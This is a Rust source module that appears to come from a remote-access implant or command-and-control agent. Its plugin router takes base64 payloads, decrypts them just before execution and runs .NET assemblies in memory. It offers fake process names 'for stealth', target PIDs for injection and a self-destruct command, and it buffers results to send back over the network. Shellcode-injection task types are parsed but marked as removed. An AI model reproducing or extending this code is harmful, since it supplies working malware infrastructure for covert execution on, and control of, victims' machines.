// Plugin Execution Router Module - Fixed Version
//
// This is a working version of the plugin router with proper brace matching
// and simplified conditional compilation structure.

use crate::types::CommandResult;
use log::{debug, error, info, warn};

use base64::Engine;
use std::collections::VecDeque;
use std::sync::{Arc, Mutex as SyncMutex};
use tokio::sync::{Mutex, mpsc, oneshot};
use tokio::time::{Duration, Instant};
use serde::{Serialize, Deserialize};
use std::collections::HashMap;
use lazy_static::lazy_static;

lazy_static! {
    /// In-memory cache for synced plugins (max 20 entries, ~50MB cap)
    static ref PLUGIN_CACHE: SyncMutex<HashMap<String, Vec<u8>>> = SyncMutex::new(HashMap::new());
    /// LRU order tracking for cache eviction
    static ref PLUGIN_CACHE_ORDER: SyncMutex<VecDeque<String>> = SyncMutex::new(VecDeque::new());
}

/// Maximum number of cached plugins
const MAX_PLUGIN_CACHE_ENTRIES: usize = 20;
/// Maximum total cache size in bytes (~50MB)
const MAX_PLUGIN_CACHE_BYTES: usize = 50 * 1024 * 1024;

/// Plugin execution task definition
#[derive(Debug, Clone)]
pub struct PluginTask {
    /// Execution type identifier
    pub execution_type: String,
    /// Binary data or script content
    pub data: Vec<u8>,
    /// Command line arguments
    pub args: Vec<String>,
    /// Optional metadata
    pub metadata: Option<PluginMetadata>,
    /// Task ID for tracking
    pub task_id: String,
    /// Request ID from original command
    pub req_id: Option<String>,
    /// Optional Plugin ID for caching/reuse
    pub plugin_id: Option<String>,
}

/// Plugin metadata for advanced execution options
#[derive(Debug, Clone)]
pub struct PluginMetadata {
    /// Custom process name for stealth (Linux memfd)
    pub fake_process_name: Option<String>,
    /// Custom AppDomain name (.NET assemblies)
    pub app_domain_name: Option<String>,
    /// Target process ID (for injection)
    pub target_pid: Option<u32>,
    /// Execution timeout in seconds
    pub timeout_seconds: Option<u64>,
    /// Priority level (0 = highest, 10 = lowest)
    pub priority: Option<u8>,
    /// Whether to run the process detached (background)
    pub detached: Option<bool>,
}

/// Buffered execution result with metadata
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BufferedResult {
    /// Task ID
    pub task_id: String,
    /// Original request ID
    pub req_id: Option<String>,
    /// Execution result
    pub result: CommandResult,
    /// Timestamp when execution completed
    pub timestamp: u64,
    /// Execution duration in milliseconds
    pub duration_ms: u64,
    /// Retry count (for failed network sends)
    pub retry_count: u32,
}

/// Batch execution request
#[derive(Debug)]
pub struct BatchExecutionRequest {
    /// Plugin task to execute
    pub task: PluginTask,
    /// Response channel for immediate acknowledgment
    pub response_tx: oneshot::Sender<Result<String, String>>,
}

/// Batch execution manager configuration
#[derive(Debug, Clone)]
pub struct BatchConfig {
    /// Maximum number of concurrent executions
    pub max_concurrent: usize,
    /// Maximum buffer size for results
    pub max_buffer_size: usize,
    /// Buffer flush interval in seconds
    pub flush_interval_secs: u64,
    /// Maximum retry attempts for network failures
    pub max_retries: u32,
    /// Retry backoff multiplier
    pub retry_backoff_ms: u64,
}

impl Default for BatchConfig {
    fn default() -> Self {
        Self {
            max_concurrent: 5,
            max_buffer_size: 1000,
            flush_interval_secs: 30,
            max_retries: 3,
            retry_backoff_ms: 1000,
        }
    }
}

/// Asynchronous batch execution manager
pub struct BatchExecutionManager {
    /// Configuration
    config: BatchConfig,
    /// Task queue sender
    task_tx: mpsc::UnboundedSender<BatchExecutionRequest>,
    /// Result buffer
    result_buffer: Arc<Mutex<VecDeque<BufferedResult>>>,
    /// Network callback for sending results
    network_callback: SyncMutex<Option<Arc<dyn Fn(Vec<BufferedResult>) -> tokio::task::JoinHandle<bool> + Send + Sync>>>,
    /// Manager handle for shutdown
    manager_handle: SyncMutex<Option<tokio::task::JoinHandle<()>>>,
}

impl BatchExecutionManager {
    /// Create new batch execution manager
    pub fn new(config: BatchConfig) -> Self {
        let (task_tx, task_rx) = mpsc::unbounded_channel();
        let result_buffer = Arc::new(Mutex::new(VecDeque::new()));
        
        let mut manager = Self {
            config,
            task_tx,
            result_buffer,
            network_callback: SyncMutex::new(None),
            manager_handle: SyncMutex::new(None),
        };
        
        // Start the background manager
        manager.start_background_manager(task_rx);
        
        manager
    }
    
    /// Submit plugin task for asynchronous execution
    pub async fn submit_task(&self, task: PluginTask) -> Result<String, String> {
        let (response_tx, response_rx) = oneshot::channel();
        
        let request = BatchExecutionRequest {
            task,
            response_tx,
        };
        
        // Send task to background manager
        if let Err(_) = self.task_tx.send(request) {
            return Err("Batch execution manager is not running".to_string());
        }
        
        // Wait for immediate acknowledgment
        match response_rx.await {
            Ok(result) => result,
            Err(_) => Err("Failed to receive task acknowledgment".to_string()),
        }
    }
    
    /// Get current buffer status
    pub async fn get_buffer_status(&self) -> (usize, usize) {
        let buffer = self.result_buffer.lock().await;
        (buffer.len(), self.config.max_buffer_size)
    }

    /// Set network callback for sending results
    pub fn set_network_callback(&self, callback: Arc<dyn Fn(Vec<BufferedResult>) -> tokio::task::JoinHandle<bool> + Send + Sync>) {
        if let Ok(mut cb) = self.network_callback.lock() {
            *cb = Some(callback);
        }
    }
    
    /// Force flush all buffered results
    pub async fn flush_buffer(&self) -> usize {
        let mut buffer = self.result_buffer.lock().await;
        let count = buffer.len();
        
        let callback_opt = if let Ok(cb) = self.network_callback.lock() {
            cb.clone()
        } else {
            None
        };

        if count > 0 && callback_opt.is_some() {
            let results: Vec<BufferedResult> = buffer.drain(..).collect();
            drop(buffer); // Release lock before network call
            
            if let Some(callback) = callback_opt {
                // Keep backup for retry logic
                let backup_results = results.clone();
                let buffer_clone = Arc::clone(&self.result_buffer);
                let max_retries = self.config.max_retries;
                let handle = callback(results);
                
                // Don't wait for network call to complete
                tokio::spawn(async move {
                    let success = handle.await.unwrap_or(false);
                    if success {
                        info!("Successfully flushed {} buffered results", backup_results.len());
                    } else {
                        warn!("Failed to flush {} buffered results, adding back to queue", backup_results.len());
                        let mut buffer = buffer_clone.lock().await;
                        // Push back in reverse to maintain original chronological order at the front of the queue
                        for mut res in backup_results.into_iter().rev() {
                            if res.retry_count < max_retries {
                                res.retry_count += 1;
                                buffer.push_front(res);
                            } else {
                                warn!("Result {} reached max retries ({}), dropping", res.task_id, max_retries);
                            }
                        }
                    }
                });
            }
        }
        
        count
    }
    
    /// Start background manager task
    fn start_background_manager(&mut self, mut task_rx: mpsc::UnboundedReceiver<BatchExecutionRequest>) {
        let config = self.config.clone();
        let result_buffer = Arc::clone(&self.result_buffer);
        
        let handle = tokio::spawn(async move {
            let mut flush_interval = tokio::time::interval(Duration::from_secs(config.flush_interval_secs));
            
            info!("🚀 Batch execution manager started (max_concurrent: {}, buffer_size: {})", 
                  config.max_concurrent, config.max_buffer_size);
            
            loop {
                tokio::select! {
                    // Handle new task requests
                    Some(request) = task_rx.recv() => {
                        let task_id = request.task.task_id.clone();
                        let task_id_for_response = task_id.clone();
                        
                        // Execute task asynchronously (simplified without semaphore for now)
                        let buffer_clone = Arc::clone(&result_buffer);
                        let config_clone = config.clone();
                        
                        tokio::spawn(async move {
                            let start_time = Instant::now();
                            let timeout_secs = request.task.metadata.as_ref()
                                .and_then(|m| m.timeout_seconds)
                                .unwrap_or(300); // 5 minute default
                            
                            // JIT Decryption: Final stage decryption before execution
                            let mut task = request.task;
                            let key = crate::config::get_aes_key();
                            if let Ok(decrypted) = crate::crypto::decrypt(&task.data, &key) {
                                debug!("Task payload JIT decrypted ({} bytes)", decrypted.len());
                                task.data = decrypted;
                            }

                            // Execute with timeout
                            let result = match tokio::time::timeout(Duration::from_secs(timeout_secs), PluginRouter::execute_plugin_internal(task)).await {
                                Ok(res) => res,
                                Err(_) => CommandResult {
                                    stdout: String::new(),
                                    stderr: format!("Task timed out after {}s", timeout_secs),
                                    path: None,
                                    req_id: None,
                                },
                            };
                            
                            let duration = start_time.elapsed();
                            
                            // Buffer the result
                            let buffered_result = BufferedResult {
                                task_id: task_id.clone(),
                                req_id: result.req_id.clone(),
                                result,
                                timestamp: std::time::SystemTime::now()
                                    .duration_since(std::time::UNIX_EPOCH)
                                    .unwrap_or_default()
                                    .as_secs(),
                                duration_ms: duration.as_millis() as u64,
                                retry_count: 0,
                            };
                            
                            // Add to buffer
                            let mut buffer = buffer_clone.lock().await;
                            buffer.push_back(buffered_result);
                            
                            // Trim buffer if too large
                            while buffer.len() > config_clone.max_buffer_size {
                                if let Some(dropped) = buffer.pop_front() {
                                    warn!("Dropped buffered result due to buffer overflow: {}", dropped.task_id);
                                }
                            }
                            
                            debug!("Task {} completed in {}ms (timeout: {}s), buffer size: {}", 
                                   task_id, duration.as_millis(), timeout_secs, buffer.len());
                        });
                        
                        // Send immediate acknowledgment
                        let _ = request.response_tx.send(Ok(task_id_for_response));
                    }
                    
                    // Periodic buffer flush
                    _ = flush_interval.tick() => {
                        let buffer = result_buffer.lock().await;
                        if !buffer.is_empty() {
                            // In this background thread context, we can't easily access self.network_callback
                            // because it's not shared. We'll rely on the BatchMessageHandler 
                            // to call flush_buffer() periodically or we need to rethink the Arc strategy.
                            // For now, let's keep it simple as the MessageHandler calls flush_buffer.
                        }
                    }
                    
                    // Handle shutdown (when all senders are dropped)
                    else => {
                        info!("Batch execution manager shutting down");
                        break;
                    }
                }
            }
        });
        
        if let Ok(mut handle_lock) = self.manager_handle.lock() {
            *handle_lock = Some(handle);
        }
    }
}

/// Unified plugin execution router
pub struct PluginRouter;

impl PluginRouter {
    /// Cache a plugin binary for future use (with LRU eviction)
    pub fn cache_plugin(id: String, data: Vec<u8>) {
        if let Ok(mut cache) = PLUGIN_CACHE.lock() {
            let data_size = data.len();
            
            // Reject single plugins larger than half the cache limit
            if data_size > MAX_PLUGIN_CACHE_BYTES / 2 {
                warn!("Plugin {} too large ({} bytes), not caching", id, data_size);
                return;
            }
            
            // Evict until we have space
            if let Ok(mut order) = PLUGIN_CACHE_ORDER.lock() {
                // Remove existing entry from order if re-caching
                order.retain(|x| x != &id);
                
                // Evict oldest entries if over count limit
                while order.len() >= MAX_PLUGIN_CACHE_ENTRIES {
                    if let Some(oldest) = order.pop_front() {
                        cache.remove(&oldest);
                    }
                }
                
                // Evict until total size is under limit
                let mut total_size: usize = cache.values().map(|v| v.len()).sum();
                while total_size + data_size > MAX_PLUGIN_CACHE_BYTES && !order.is_empty() {
                    if let Some(oldest) = order.pop_front() {
                        if let Some(removed) = cache.remove(&oldest) {
                            total_size -= removed.len();
                        }
                    }
                }
                
                order.push_back(id.clone());
            }
            
            debug!("Caching plugin: {} ({} bytes)", id, data_size);
            cache.insert(id, data);
        }
    }

    /// Retrieve a plugin from cache (updates LRU order)
    pub fn get_cached_plugin(id: &str) -> Option<Vec<u8>> {
        if let Ok(cache) = PLUGIN_CACHE.lock() {
            if let Some(data) = cache.get(id).cloned() {
                // Update LRU order (move to back = most recently used)
                if let Ok(mut order) = PLUGIN_CACHE_ORDER.lock() {
                    order.retain(|x| x != id);
                    order.push_back(id.to_string());
                }
                return Some(data);
            }
        }
        None
    }

    /// Execute plugin (legacy method for backward compatibility)
    pub async fn execute_plugin(task: PluginTask) -> CommandResult {
        warn!("⚠️ Using deprecated execute_plugin method. Consider using BatchExecutionManager for better performance.");
        Self::execute_plugin_internal(task).await
    }
    
    /// Internal plugin execution method
    async fn execute_plugin_internal(task: PluginTask) -> CommandResult {
        info!("🔌 PLUGIN ROUTER: Executing plugin type '{}'", task.execution_type);
        debug!("Data size: {} bytes, Args: {:?}", task.data.len(), task.args);
        
        if let Some(ref metadata) = task.metadata {
            debug!("Metadata: {:?}", metadata);
        }
        
        let req_id = task.req_id.clone();
        
        // Route to appropriate execution method
        let mut result = Self::route_execution(task).await;
        
        // Set the request ID
        result.req_id = req_id;
        result
    }
    
    /// Route execution based on type and platform
    async fn route_execution(task: PluginTask) -> CommandResult {
        match task.execution_type.as_str() {
            "execute-assembly" => Self::handle_execute_assembly(task).await,
            "self-destruct" => Self::handle_self_destruct().await,
            // Process injection types permanently removed
            "hollow-shellcode" | "native-pe" | "inject-shellcode" | "memfd-exec"
            | "shellcode-inject" => CommandResult {
                stdout: String::new(),
                stderr: format!(
                    "execution type '{}' removed: process injection is not supported",
                    task.execution_type
                ),
                path: None,
                req_id: None,
            },
            _ => {
                error!("Unsupported execution type: {}", task.execution_type);
                CommandResult {
                    stdout: String::new(),
                    stderr: format!("Unsupported execution type '{}'", task.execution_type),
                    path: None,
                    req_id: None,
                }
            }
        }
    }
    
    /// Handle .NET assembly execution
    async fn handle_execute_assembly(task: PluginTask) -> CommandResult {
        #[cfg(all(feature = "dotnet", target_os = "windows"))]
        {
            info!("Routing to .NET assembly execution (Windows)");
            let app_domain = task
                .metadata
                .as_ref()
                .and_then(|m| m.app_domain_name.as_deref());
            crate::dotnet::DotNetExecutor::execute_assembly(task.data, task.args, app_domain).await
        }
        #[cfg(not(all(feature = "dotnet", target_os = "windows")))]
        {
            let _ = task;
            CommandResult {
                stdout: String::new(),
                stderr: "execute-assembly not compiled into this agent (missing dotnet feature)"
                    .to_string(),
                path: None,
                req_id: None,
            }
        }
    }

    /// Handle self-destruct
    async fn handle_self_destruct() -> CommandResult {
        info!("Routing to self-destruct (cross-platform)");
        crate::utils::self_destruct().await
    }

    
    /// Return error for unsupported platform
    #[allow(dead_code)]
    fn unsupported_on_platform(execution_type: &str, required_platform: &str) -> CommandResult {
        let current_os = std::env::consts::OS;
        CommandResult {
            stdout: String::new(),
            stderr: format!(
                "Execution type '{}' is only supported on {}. Current OS: {}",
                execution_type, required_platform, current_os
            ),
            path: None,
            req_id: None,
        }
    }
    
    /// Parse plugin task from command payload
    pub fn parse_plugin_task(execution_type: &str, command_content: &str, req_id: Option<String>) -> Result<PluginTask, String> {
        let content = command_content.trim();
        
        // Generate unique task ID
        let task_id = format!("task_{}_{:08x}", execution_type, crate::utils::next_u32());
        
        // Special case: self-destruct can have empty content
        if execution_type == "self-destruct" {
            return Ok(PluginTask {
                execution_type: execution_type.to_string(),
                data: vec![],
                args: vec![],
                metadata: None,
                task_id,
                req_id,
                plugin_id: None,
            });
        }
        
        if content.is_empty() {
            return Err("Plugin command content is empty".to_string());
        }

        // 🚀 OPTIMIZATION: Check if plugin is in cache
        if content.starts_with("cached:") {
            let parts: Vec<&str> = content[7..].splitn(2, '|').collect();
            let id = parts[0];
            let args_part = if parts.len() > 1 { parts[1] } else { "" };
            
            if let Some(cached_data) = Self::get_cached_plugin(id) {
                let args = args_part.split_whitespace().map(|s| s.to_string()).collect();
                return Ok(PluginTask {
                    execution_type: execution_type.to_string(),
                    data: cached_data,
                    args,
                    metadata: None,
                    task_id,
                    req_id,
                    plugin_id: Some(id.to_string()),
                });
            } else {
                return Err(format!("Plugin with ID '{}' not found in cache", id));
            }
        }
        
        match execution_type {
            "hollow-shellcode" | "native-pe" | "shellcode-inject" => {
                // Format: "target_exe|base64_shellcode" or just "base64_shellcode"
                let (target_exe, shellcode_b64) = if content.contains('|') {
                    let parts: Vec<&str> = content.splitn(2, '|').collect();
                    (Some(parts[0].to_string()), parts[1])
                } else {
                    (None, content)
                };
                
                let shellcode = base64::engine::general_purpose::STANDARD.decode(shellcode_b64.trim())
                    .map_err(|e| format!("Invalid base64 payload: {}", e))?;
                
                Ok(PluginTask {
                    execution_type: execution_type.to_string(),
                    data: shellcode,
                    args: vec![],
                    metadata: Some(PluginMetadata {
                        fake_process_name: target_exe,
                        target_pid: None,
                        app_domain_name: None,
                        timeout_seconds: None,
                        priority: None,
                        detached: None,
                    }),
                    task_id,
                    req_id,
                    plugin_id: None,
                })
            }
            "execute-assembly" => {
                // Format: "app_domain|args|base64_assembly" or "args|base64_assembly" or "base64_assembly"
                let parts: Vec<&str> = content.split('|').collect();
                
                let (app_domain, args, assembly_b64) = match parts.len() {
                    1 => (None, vec![], parts[0]),
                    2 => (None, parts[0].split_whitespace().map(|s| s.to_string()).collect(), parts[1]),
                    3 => (Some(parts[0].to_string()), parts[1].split_whitespace().map(|s| s.to_string()).collect(), parts[2]),
                    _ => return Err("Invalid assembly format, expected: [app_domain|][args|]base64_assembly".to_string()),
                };
                
                let assembly_bytes = base64::engine::general_purpose::STANDARD.decode(assembly_b64.trim())
                    .map_err(|e| format!("Invalid base64 assembly data: {}", e))?;
                
                Ok(PluginTask {
                    execution_type: execution_type.to_string(),
                    data: assembly_bytes,
                    args,
                    metadata: Some(PluginMetadata {
                        app_domain_name: app_domain,
                        fake_process_name: None,
                        target_pid: None,
                        timeout_seconds: None,
                        priority: None,
                        detached: None,
                    }),
                    task_id,
                    req_id,
                    plugin_id: None,
                })
            }
            "memfd-exec" | "linux-script" => {
                // Format: "fake_name|base64_elf" or "base64_elf"
                let (fake_name, elf_b64) = if content.contains('|') {
                    let parts: Vec<&str> = content.splitn(2, '|').collect();
                    (Some(parts[0].to_string()), parts[1])
                } else {
                    (None, content)
                };
                
                let elf_bytes = base64::engine::general_purpose::STANDARD.decode(elf_b64.trim())
                    .map_err(|e| format!("Invalid base64 payload data: {}", e))?;
                
                Ok(PluginTask {
                    execution_type: execution_type.to_string(),
                    data: elf_bytes,
                    args: vec![],
                    metadata: Some(PluginMetadata {
                        fake_process_name: fake_name,
                        app_domain_name: None,
                        target_pid: None,
                        timeout_seconds: None,
                        priority: None,
                        detached: None,
                    }),
                    task_id,
                    req_id,
                    plugin_id: None,
                })
            }

            _ => {
                // Generic format: try to decode as base64 or use as raw data
                let data = if let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(content) {
                    decoded
                } else {
                    content.as_bytes().to_vec()
                };
                
                Ok(PluginTask {
                    execution_type: execution_type.to_string(),
                    data,
                    args: vec![],
                    metadata: None,
                    task_id,
                    req_id,
                    plugin_id: None,
                })
            }
        }
    }
    
    /// Parse plugin task from command payload (backward compatibility)
    pub fn parse_plugin_task_compat(execution_type: &str, command_content: &str) -> Result<PluginTask, String> {
        Self::parse_plugin_task(execution_type, command_content, None)
    }
}